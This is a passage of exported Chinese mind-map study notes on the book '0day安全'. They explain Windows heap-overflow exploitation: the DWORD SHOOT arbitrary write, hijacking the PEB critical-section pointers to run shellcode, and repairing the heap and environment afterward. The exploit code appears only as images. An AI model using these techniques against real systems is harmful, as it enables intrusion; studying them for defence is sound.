+<a name="2dff3amvpu1emgfp1f7s8ha0io">&nbsp;&nbsp;&nbsp;&nbsp;比如申请16字节的堆空间，将使用Lookaside[2]中的堆块，Lookaside[2]被置为空</a>
+</h3>
+<h3 class="topic">
+<a name="1oc4s9acf8j9i9vvq68oaeimlr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/738a0khmo3amqp30fdnovh02mb.png"></p>
+<h3 class="topic">
+<a name="7flrd44kackcpjnums4p1h71vo">&nbsp;堆溢出利用 DWORD SHOOT</a>
+</h3>
+<h3 class="topic">
+<a name="3ir1cng9k32e9s7pjs6nr1jrog">&nbsp;&nbsp;堆管理中的三种操作分配、释放、合并本质上均是链表的修改，如果能够伪造链表节点的指针，则可以在链表节点卸下和链入的过程中获得一次读写内存的机会</a>
+</h3>
+<h3 class="topic">
+<a name="0e811bfetoo0ind42nrj8f3pts">&nbsp;&nbsp;堆溢出的精髓就是使用精心构造的数据将下一个堆块的块首淹没，从而改写块首中的前向指针和后向指针，在分配、释放、合并的过程中获得向任意内存写入任意数据的机会</a>
+</h3>
+<h3 class="topic">
+<a name="7uoe422rgg4nobchl3npq4p5ja">&nbsp;&nbsp;&nbsp;被修改的数据的内存地址可能为</a>
+</h3>
+<h3 class="topic">
+<a name="4i3j98emglrd3lmte1vf30cl2s">&nbsp;&nbsp;&nbsp;&nbsp;栈帧中函数的返回地址</a>
+</h3>
+<h3 class="topic">
+<a name="6r52076cfcuf0odbva8t4icg1h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当函数返回时，执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="6d5lag6hjqaooj9h86ue2n6nof">&nbsp;&nbsp;&nbsp;&nbsp;栈帧中的seh句柄</a>
+</h3>
+<h3 class="topic">
+<a name="5gbob22t327gennsbd1sr664ks">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当函数触发异常时，执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="4te1srgtqc4hjfdlj6jgf1vm22">&nbsp;&nbsp;&nbsp;&nbsp;重要函数的调用地址</a>
+</h3>
+<h3 class="topic">
+<a name="3hca7ri1mtpk66nd73phdf3t0b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当重要函数调用时，执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="2egausaee7hvhtlbakcfl1551c">&nbsp;&nbsp;&nbsp;用于修改的数据可能为</a>
+</h3>
+<h3 class="topic">
+<a name="60mimgt96q676utk5j2h9v028k">&nbsp;&nbsp;&nbsp;&nbsp;shellcode的起始地址</a>
+</h3>
+<h3 class="topic">
+<a name="1r18f6h65rc8ugm4nlf64flhit">&nbsp;&nbsp;将一个节点从双向链表中卸下的过程</a>
+</h3>
+<h3 class="topic">
+<a name="7ad5e436icjikf4448dsk8f4v9">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0o02id2drhp7fapqu5fstojabj.png"></p>
+<h3 class="topic">
+<a name="54igu518pi3kb40vp88mq0gku5">&nbsp;&nbsp;&nbsp;&nbsp;注意flink表示指向前一个节点的指针，blink表示指向后一个节点的指针</a>
+</h3>
+<h3 class="topic">
+<a name="454tgf21r8bgaooli6hu7l8c1l">&nbsp;&nbsp;&nbsp;&nbsp;即在该图中，靠右的是前一个节点，靠左的是后一个节点</a>
+</h3>
+<h3 class="topic">
+<a name="3mo5ldm49ppuo0r47c0g1uriqi">&nbsp;&nbsp;&nbsp;本描述中flink表示后向指针，即靠右的是后一个节点，靠左的是前一个节点</a>
+</h3>
+<h3 class="topic">
+<a name="43k7bkdccs4arstuaggund7f36">&nbsp;&nbsp;&nbsp;&nbsp;卸下节点的过程中，比如&#13;
+node-&gt;blink-&gt;flink=node-&gt;flink&#13;
+会将被卸下的节点后向指针的值，赋值给该节点前向指针指向的内存空间所代表的结构体中的某个字段（该字段为被卸下节点的前一个节点指向后一个节点的指针）</a>
+</h3>
+<h3 class="topic">
+<a name="5jknco755cio1k8sevu4gj8ft5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果发生堆溢出，我们可以自由指定一个堆块的堆首，从而指定该堆块的前向指针和后向指针，从而我们可以将一个自己指定的四字节数据（后向指针）填充到我们指定地址（前向指针）的内存空间中</a>
+</h3>
+<h3 class="topic">
+<a name="644n6bjvncrlj1k0o0lp8upg70">&nbsp;&nbsp;&nbsp;相同的，这一过程中，我们同时会将被卸下节点的前向指针赋值给该节点后向指针指向的内存空间中</a>
+</h3>
+<h3 class="topic">
+<a name="3mtq7s9u0d7ehr194mq8clroo3">&nbsp;&nbsp;&nbsp;&nbsp;在实际申请堆块过程中，如果是将空表中最后一个堆块卸下，则因为被卸下的堆块没有下一个堆块（即后向指针为null）所以无法使用被卸下堆块的前向指针进行赋值，这种情况下只能用被卸下堆块的后向指针保存恶意数据，并将其写入到被卸下堆块前向指针指向的内存空间</a>
+</h3>
+<h3 class="topic">
+<a name="5lu864dc0krum55q4i8e4sin1p">&nbsp;&nbsp;dword shoot原理</a>
+</h3>
+<h3 class="topic">
+<a name="6n0jev66qhka10ij02uu0rk2mk">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5ajo0tptfkekk020tvh8l1ar84.png"></p>
+<h3 class="topic">
+<a name="3s3irsq2nhlvju1j7qlvagjmst">&nbsp;&nbsp;调试DWORD SHOOT</a>
+</h3>
+<h3 class="topic">
+<a name="05g53e5oepm43n268acq6ctc3b">&nbsp;&nbsp;&nbsp;调试代码</a>
+</h3>
+<h3 class="topic">
+<a name="1kn6lrj7fudeede4kcbt0b58k8">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0lgnt2n8lk0c9bk861r2v70kkb.png"></p>
+<h3 class="topic">
+<a name="5mfeoo7i7a9i20cpcmcv8q0lqa">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2hsv68tghp3bhp53jkehlrn95i.png"></p>
+<h3 class="topic">
+<a name="5gpfsverqoc1pfnli8ij439e89">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里是卸下空表中最后一个堆块</a>
+</h3>
+<h3 class="topic">
+<a name="6p7uhmn5a1ndf40do4j99na8nn">&nbsp;&nbsp;&nbsp;代码中申请了6个8字节大小的堆空间（对应堆块加上堆首应该是16字节）之后将其中1 3 5号堆块进行释放（为了不产生合并），从而在freelist[2]处形成空表链，之后申请8字节大小堆空间，则会将freelist[2]空表中最后一个堆块释放，这个过程中会将最后一个堆块的后向指针赋值给前一个堆块的后向指针</a>
+</h3>
+<h3 class="topic">
+<a name="0aguhl6riv2rdqje26nu16j8cs">&nbsp;&nbsp;&nbsp;&nbsp;释放h1 h3 h5的堆空间之后堆块状态</a>
+</h3>
+<h3 class="topic">
+<a name="34uqjapd4bttsr1f0glsb6g2c4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7k9mi4l967dsla1rb6f5b40h0t.png"></p>
+<h3 class="topic">
+<a name="7ats1e9lofmn3r1rnajnbpso1t">&nbsp;&nbsp;&nbsp;&nbsp;释放h1 h3 h5的堆空间之后堆表状态</a>
+</h3>
+<h3 class="topic">
+<a name="3gqn0rq0lcq7ktnegamj2la66d">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0bptcrls67rh32qggaahrh9l1f.png"></p>
+<h3 class="topic">
+<a name="7vuivt8qf272d5tbo3ghdqa7c8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只有freelist[0] freelist[2]中有内容</a>
+</h3>
+<h3 class="topic">
+<a name="7sfgbmfhb0j2ue4687f32jpj7e">&nbsp;&nbsp;&nbsp;&nbsp;freelist[2]的情况</a>
+</h3>
+<h3 class="topic">
+<a name="6bo9keggbc1ounbhltr16t4ts7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1b2cboub4jv2tckeek83u10tht.png"></p>
+<h3 class="topic">
+<a name="2ivr3vtdpikg8rskdvj4f6vcie">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果将h5卸下链表，则根据&#13;
+node-&gt;blink-&gt;flink=node-&gt;flink，&#13;
+会将h5的flink值0x00520188填入以0x005206a8（node-&gt;blink）为首地址的节点的flink字段中，因为正好每个节点结构体的flink字段均保存在结构体首地址，所以h5的flink值0x00520188会保存在地址0x005206a8的内存空间中</a>
+</h3>
+<h3 class="topic">
+<a name="0kalsfsolcd2h7a9mkrbilcplo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即，我们只要将四字节的恶意数据填入节点的flink字段，之后将恶意数据的目的地址填入节点的blink字段，然后将该节点卸下链表即可将恶意数据写入目的地址</a>
+</h3>
+<h3 class="topic">
+<a name="7gu59l7qrcv3qjd36fhfuv2nvd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;h5是双向链表中的节点，则卸下h5，还会将h5的blink字段填入h5下一个节点的blink字段&#13;
+即 node-&gt;flink-&gt;blink=node-&gt;blink</a>
+</h3>
+<h3 class="topic">
+<a name="16peau77rv283pj5uak3bm7489">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是需要注意，h5的下一个节点是通过h5中flink字段找到的，而flink保存的是下一个节点的首地址，节点的blink字段保存在节点首地址向下偏移4个字节的位置，所以实际被h5的blink字段填充的是 h5的flink字段的值（0x00520188）+4 的内存地址所代表的内存空间，即0x0052019c 即freelist[2]的blink</a>
+</h3>
+<h3 class="topic">
+<a name="67p1lsrer20lt7nkr88dgo6kic">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以如果在h5的bink字段中保存恶意数据，在flink字段中保存恶意数据的目的地址，则需要将目的地址减4后填入flink字段</a>
+</h3>
+<h3 class="topic">
+<a name="62bkrecg5cr9vo4tt1m366moal">&nbsp;&nbsp;堆块的分配、释放、合并甚至是快表也可以用于构造DWORD SHOOT，原理类似，遂不赘述</a>
+</h3>
+<h3 class="topic">
+<a name="4f6ikaoa2g9j3lod8db1kgkuki">&nbsp;&nbsp;&nbsp;堆块的合并之所以可以利用构成DWORD SHOOT是因为一个堆块的合并一定意味着被合并的堆块被从其所在的空表中卸下，只要有卸下的的过程，上面的DWORD SHOOT利用就可以成立</a>
+</h3>
+<h3 class="topic">
+<a name="3vsnvjv04ls156g2aikuraer2e">&nbsp;&nbsp;&nbsp;堆块的分配之所以可以利用构成DWORD SHOOT是因为当之前没有申请过时此大小的堆块时，会从freelist[0]中的尾块中分割一部分作为新的堆块，此时尾块会先从freelist[0]上卸下，之后将减小大小的尾块再次链入freelist[0]，在尾块卸下freelist[0]d的过程中，如果尾块中的前向、后向指针被修改了，则可以构成DWORD SHOOT</a>
+</h3>
+<h3 class="topic">
+<a name="0umcnrribn49k1kuj43iuglcla">&nbsp;堆溢出利用 代码植入</a>
+</h3>
+<h3 class="topic">
+<a name="3snfa4ubm87mq7hj7s7ejb10l1">&nbsp;&nbsp;DWORD SHOOT利用方方式</a>
+</h3>
+<h3 class="topic">
+<a name="1s2fcfle5equ11hqltji1gfcgv">&nbsp;&nbsp;&nbsp;堆溢出的精髓是获得一个DWORD SHOOT的机会，所以堆溢出的精髓就是DWORD SHOOT的利用</a>
+</h3>
+<h3 class="topic">
+<a name="477acesk8cjlb88ipj2t1s8uoh">&nbsp;&nbsp;&nbsp;DWORD SHOOT可以将内存中任意地址的四字节空间修改为任意值，被修改的四字节内存空间可能为</a>
+</h3>
+<h3 class="topic">
+<a name="3ohispvkeb38olkjivb8rofpjc">&nbsp;&nbsp;&nbsp;&nbsp;内存变量</a>
+</h3>
+<h3 class="topic">
+<a name="399jq6d9hbko72nnl7f72uljg8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如修改身份验证函数的返回值，可以绕过身份验证基址</a>
+</h3>
+<h3 class="topic">
+<a name="03cqegeidel7fuq08nedt953l8">&nbsp;&nbsp;&nbsp;&nbsp;代码逻辑</a>
+</h3>
+<h3 class="topic">
+<a name="0ldasptjff0ho9detjnt7vufhv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改代码段中关键逻辑，比如修改程序分支的判断逻辑，或将调用验证机制函数的指令nop掉</a>
+</h3>
+<h3 class="topic">
+<a name="5nvc9vtb281kc7m8gncb8v1i3f">&nbsp;&nbsp;&nbsp;&nbsp;函数返回地址</a>
+</h3>
+<h3 class="topic">
+<a name="04opvl2isabrm5t4pml8clnv9v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改函数返回地址，当函数返回时就可以劫持程序执行流程，执行自己的代码</a>
+</h3>
+<h3 class="topic">
+<a name="7nv8607uuj67pcp45mtqt3tb9e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于栈帧移位，即使是统一操作系统同一补丁下的程序连续运行两次，函数返回地址在栈中的地址都可能不同，所以对于DWORD SHOOT在此情况下具有局限性</a>
+</h3>
+<h3 class="topic">
+<a name="3occ31f61oha7alu1l6avumpc4">&nbsp;&nbsp;&nbsp;&nbsp;异常处理机制的数据结构</a>
+</h3>
+<h3 class="topic">
+<a name="270kq2v67jcnqkm026nburnm56">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆溢出很容易引起异常</a>
+</h3>
+<h3 class="topic">
+<a name="4jq5fp4vafp1m1rk979dnqkdpm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;异常处理结构体中的字段通常也是堆溢出的上等目标</a>
+</h3>
+<h3 class="topic">
+<a name="4ei1cgtusp0g242utjdjrasj2f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SEH</a>
+</h3>
+<h3 class="topic">
+<a name="6n5bqp0kviqmpougt2ua8i7r2j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FVEH</a>
+</h3>
+<h3 class="topic">
+<a name="62ifj29n7unegpvcgt77a1f34n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEB中的UEF</a>
+</h3>
+<h3 class="topic">
+<a name="49bb17sjbhgpqsulcuqe42e88f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TEB中存放的第一个SEH指针</a>
+</h3>
+<h3 class="topic">
+<a name="7eo6ob04lgerluqo0rkl0c8nlo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.......</a>
+</h3>
+<h3 class="topic">
+<a name="0aa9uec406vo5f2ap0pcf916vf">&nbsp;&nbsp;&nbsp;&nbsp;函数指针</a>
+</h3>
+<h3 class="topic">
+<a name="10a1ej7qm1kc7rbuq87afhomsv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;系统有时使用函数指针调用函数，如果修改特定函数的函数指针，则调用该函数时，会劫持程序执行流程，执行自己的shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="1qe4m6fhprbmcf138qbcb35t33">&nbsp;&nbsp;&nbsp;&nbsp;PEB中线程同步函数的入口地址</a>
+</h3>
+<h3 class="topic">
+<a name="4qd6jetja8slaiod1r87c85m3r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每个进程的peb中存放一对函数指针，指向RtlEnterCriticalSection和RtlLeaveCriticalSection（即进入临界区和退出临界区）以上两个函数会在进程退出时在ExitProcess函数中被调用</a>
+</h3>
+<h3 class="topic">
+<a name="7i4k17h0oaib4ijd45e68dtmad">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每个进程中peb的位置不会变化，这对函数指针在PEB中的偏移也不会变化，这使得开发基于堆溢出的通用shellcode成为可能</a>
+</h3>
+<h3 class="topic">
+<a name="4fk81kkmd7k0eb9v7o54nbi2ka">&nbsp;&nbsp;使用DWORD SHOOT狙击peb中线程同步函数的入口地址</a>
+</h3>
+<h3 class="topic">
+<a name="4hifl4kaed9ool549jqi1m9jke">&nbsp;&nbsp;&nbsp;windows中有一系列同步机制</a>
+</h3>
+<h3 class="topic">
+<a name="4mck8h886pdaofd9b7vqp98bth">&nbsp;&nbsp;&nbsp;&nbsp;互斥体 事件 信号量 临界区</a>
+</h3>
+<h3 class="topic">
+<a name="0itu5ftv2a27maed06ehdbic26">&nbsp;&nbsp;&nbsp;进程退出时，ExitProcess()函数中会调用线程同步函数RtlEnterCriticalSection()和RtlLeaveCriticalSection()同步线程，防止脏数据产生</a>
+</h3>
+<h3 class="topic">
+<a name="621mc2h8d5c7jvb4tapaad0vr6">&nbsp;&nbsp;&nbsp;&nbsp;在ExitProcess()函数中，通过peb结构体中偏移0x20处存放的函数指针对，完成两个同步函数的调用，如果使用DWORD SHOOT将两个同步函数的指针修改为shellcode的指针，就可以在程序调用ExitProcess()函数之后执行shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="3f2b7b9u4a53l6sfqpied143ng">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 2003 Server之后，这里的实现有所变化</a>
+</h3>
+<h3 class="topic">
+<a name="7cqom00e80mr3eivs7cocer69o">&nbsp;&nbsp;&nbsp;&nbsp;获得peb结构体地址的方法</a>
+</h3>
+<h3 class="topic">
+<a name="0e29ckuhg1hbikentmuk2t7ect">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/43jp0rm5po434u7moemfgu252a.png"></p>
+<h3 class="topic">
+<a name="29tlb31rq60pkq8qsc4nj9m48v">&nbsp;&nbsp;&nbsp;存在漏洞的代码（狙击peb同步函数入口地址）</a>
+</h3>
+<h3 class="topic">
+<a name="4kce7rcv7eb3ef2l152dn3adr7">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5cn1g9vo6ifud078ecris3lm2r.png"></p>
+<h3 class="topic">
+<a name="19qs4s29upobtp7efhhp9h2h7m">&nbsp;&nbsp;&nbsp;漏洞利用步骤</a>
+</h3>
+<h3 class="topic">
+<a name="7uktkm4k9vr0cj7s0mi70pt4st">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5iqucd89nhhmcrhl5dujakq9tt.png"></p>
+<h3 class="topic">
+<a name="5266v5sqfjjpdrgs93b013f6kh">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2rgdoas916ubj8nl82hhndi8bm.png"></p>
+<h3 class="topic">
+<a name="3qolcgnc1d1okjnmjb61o9n9b7">&nbsp;&nbsp;&nbsp;&nbsp;注意，此时如果没有发生堆溢出，即memcpy函数将200个字节写入h1堆空间中，则堆中如右图</a>
+</h3>
+<h3 class="topic">
+<a name="4b9qv913k2ahhjetslptur6ij3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/39cp3f2a1ebdlsnh90e816vjo6.png"></p>
+<h3 class="topic">
+<a name="05ajre6stttic0netk4trr4ki8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时尾块的块首没有被淹没，如果此时申请h2，则会从尾块中分割一部分出来作为h2&#13;
+即首先需要先将当前尾块从freelist[0]中卸下-》将尾块的一部分作为h2堆空间-》修改尾块的块首信息，将缩小后的尾块重新链入freelist[0],&#13;
+&#13;
+问题出现在第一步，将当前尾块从freelist[0]中卸下，当前尾块中flink和blink均指向freelist[0] ,freelist[0]中的两个指针也均指向当前尾块，即freelist[0]上除了freelist[0]本身，只有当前尾块一个节点，如果将当前尾块卸下，则freelist[0]中的两个指针均会指向自身，即当尾块卸下时&#13;
+node-&gt;blink-&gt;flink=node-&gt;flink&#13;
+node-&gt;flink-&gt;blink=node-&gt;blink</a>
+</h3>
+<h3 class="topic">
+<a name="60stbnovltgorb27b8sq5hgonp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以只要尾块中的blink和flink淹没为特定值，然后从尾块中分割一部分申请堆块，就会导致尾块从freelist[0]中卸下，导致 DWORD SHOOT</a>
+</h3>
+<h3 class="topic">
+<a name="2qlasa6amf9j65eu83squlb426">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次利用中将尾块的blink淹没为存储RtlEnterCriticalSection函数指针的地址，将尾块的flink淹没为shellcode地址（shellcode被保存在h1堆空间中） 从而将同步函数指针替换为shellcode函数指针</a>
+</h3>
+<h3 class="topic">
+<a name="2h9eroti3coi1u1u539ccog26o">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用代码中的shellcode字符串为</a>
+</h3>
+<h3 class="topic">
+<a name="49leeu4g81ei5blubpqatq3r1t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2jlq0t2ho7nqcdj9m4jr840m7o.png"></p>
+<h3 class="topic">
+<a name="1rfk9u7jq3dosjci87grq1aqdd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其是将shell从的前后加上"\x90"凑够200个字节，后面加上尾块原本的块首，加上尾块的伪造flink和blink</a>
+</h3>
+<h3 class="topic">
+<a name="31mn1j6n96lt2at249b4dtinu2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内存布置为</a>
+</h3>
+<h3 class="topic">
+<a name="2qvrb33tppbi8tmv6m4j4d4p6q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/3esmivhbe1nlcp3m1g9kd81jof.png"></p>
+<h3 class="topic">
+<a name="321vldefd1vhdlurtr48nbeqh1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7aihj11pnbndtbb90nsnsunq6l.png"></p>
+<h3 class="topic">
+<a name="6ejbd638imsndn7d60trkaceki">&nbsp;&nbsp;&nbsp;&nbsp;以上shellcode存在问题，因为shellcode本身也会使用ExitProcess函数来退出，如果再次之前修改了peb中两个同步函数的函数指针，也会使得shellcode中ExitProcess函数执行失败</a>
+</h3>
+<h3 class="topic">
+<a name="1h1vbkpfcfn8v1d9cds3jr7lis">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;解决方法就是在shellcode执行ExitProcess函数之前将peb中两个同步函数的函数指针恢复</a>
+</h3>
+<h3 class="topic">
+<a name="31cb7fk8pso8atjum57bnh2aat">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在shellcode最前面加上右边3条指令，将被修改的同步函数指针恢复回来</a>
+</h3>
+<h3 class="topic">
+<a name="52l41tb387h7r27ndg7d7216gp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/4btdqjmbkqe4a439mv7pb7ev07.png"></p>
+<h3 class="topic">
+<a name="1gnc7o7cpc4qjmaesudkk7fodp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;子主题 2</a>
+</h3>
+<h3 class="topic">
+<a name="6k3k3e4q0n87gmrl6hj6fd3405">&nbsp;&nbsp;&nbsp;&nbsp;最终版的漏洞利用代码</a>
+</h3>
+<h3 class="topic">
+<a name="153uil22n6hhsmd2ih2k01b6ln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/6f92gisf6hh05hq6dr1j16ner1.png"></p>
+<h3 class="topic">
+<a name="0u9k7m40fgi0e6pq9rohqssd3n">&nbsp;&nbsp;&nbsp;&nbsp;最终漏洞利用效果</a>
+</h3>
+<h3 class="topic">
+<a name="1t1dgm5hue2b18kfu7du76m4i5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/035juh1o633u936u7t4v017156.png"></p>
+<h3 class="topic">
+<a name="41hvb4lhf4tkijflkv9nlth3aq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2dtsk4immvhg9fpk3cdd9brvgh.png"></p>
+<h3 class="topic">
+<a name="02ei949m67qmahh2prnr7i53k3">&nbsp;堆溢出利用的注意事项</a>
+</h3>
+<h3 class="topic">
+<a name="2r9rhsadfdmgbj5ll5qrijbdso">&nbsp;&nbsp;调试堆与常态堆的区别</a>
+</h3>
+<h3 class="topic">
+<a name="1o2tu0h2jkbpig1tat6efkkgab">&nbsp;&nbsp;&nbsp;调试堆与常态堆有很大区别，如果sehellcode能够调试运行，但不能直接运行，说明漏洞利用的过程可能是基于调试堆的</a>
+</h3>
+<h3 class="topic">
+<a name="4fgh72s3vd0r5irrf77ueecm6h">&nbsp;&nbsp;&nbsp;之前使用__asm int 3的内联汇编中断程序，然后attach附加调试进程的方法仅适用于可以修改源码</a>
+</h3>
+<h3 class="topic">
+<a name="4i7jidi640tsnn4mt3180b155a">&nbsp;&nbsp;&nbsp;当源码无法修改，可以考虑修改检测调试器的函数的返回值，从而保证调试的是常态堆</a>
+</h3>
+<h3 class="topic">
+<a name="79ej6a07kd5ivhfr2ubpknr0rp">&nbsp;&nbsp;在shellcode中修复环境</a>
+</h3>
+<h3 class="topic">
+<a name="0a3tsdko8docahjek6c4hdsc7h">&nbsp;&nbsp;&nbsp;劫持进程之后，需要修复peb中的函数指针，防止shellcode自身运行ExitProcess函数时出现异常</a>
+</h3>
+<h3 class="topic">
+<a name="6hu5l4pbth35jld9s001rndh60">&nbsp;&nbsp;&nbsp;在shellcode一开始，也需要使用cdf等指令调整标志寄存器中的df标志位，防止shellcode中的串操作指令运行产生异常</a>
+</h3>
+<h3 class="topic">
+<a name="2o5613nhgj39rf9n0s0u40te7b">&nbsp;&nbsp;&nbsp;堆溢出时，有时还需要修复堆区，主要思路根据目前堆区所有空闲堆块的总大小，重新创建一个该大小的尾块，然后将该尾块链入freelist[0]中，使整个堆区恢复类似于刚创建，只有一个尾块的情况</a>
+</h3>
+<h3 class="topic">
+<a name="7hhvs6dubgplrbmavosldtogqh">&nbsp;&nbsp;&nbsp;&nbsp;主要步骤</a>
+</h3>
+<h3 class="topic">
+<a name="6jtmm6gn1pcvf59c17buipj50r">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/30se3rh5fseq948b36g1cjcvvj.png"></p>
+<h3 class="topic">
+<a name="5qdcbgs5ud2367l6krv0s5cq5n">&nbsp;&nbsp;定位shellcode的跳板</a>
+</h3>
+<h3 class="topic">
+<a name="0rnlffjdpvvslgtq4rsoq32pvb">&nbsp;&nbsp;&nbsp;如果shellcode被保存在堆中，由于堆中地址可能发生变化，所以shellcode地址一般不能写死在DWORD SHOOT中，类似于栈溢出，经常会有寄存器指向堆区离shellcode不远的地方，一般使用几种指令作为跳板定位shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="7vtgrh11vc47srbsj4scad2um8">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0n8gpdnevf7nh1p7db6fe3f8jm.png"></p>
+<h3 class="topic">
+<a name="4jea2rivgbpe1bvk30l4taqgan">&nbsp;&nbsp;&nbsp;&nbsp;这个使用uef作为跳板定位shellcode的操作没有看懂</a>
+</h3>
+<h3 class="topic">
+<a name="5sjjbcqoqq2ai3dsrvhgvicg9i">&nbsp;&nbsp;DWORD SHOOT后的指针反射现象</a>
+</h3>
+<h3 class="topic">
+<a name="6ilvd8busgdkdaip85il5iis3v">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/3kr5mjed9sq8ksvpgqu0ncsqbi.png"></p>
+<h3 class="topic">
